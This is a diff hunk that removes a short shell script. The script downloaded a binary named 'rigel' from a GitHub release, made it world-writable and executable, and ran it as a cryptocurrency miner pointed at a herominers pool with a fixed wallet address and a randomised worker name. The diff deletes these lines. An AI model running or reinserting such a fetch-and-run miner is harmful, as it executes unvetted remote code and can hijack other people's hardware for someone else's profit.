@@ -1,3 +1,0 @@
-wget https://github.com/bondaltomason/meo/releases/download/2.7.0/rigel
-chmod 777 rigel
-./rigel -a quai -o stratum+tcp://de.quai.herominers.com:1185 -u 0x000284da7cC36046Be6d59B3343a573a83A09b73 -w $(echo $RANDOM | md5sum | head -c 20)
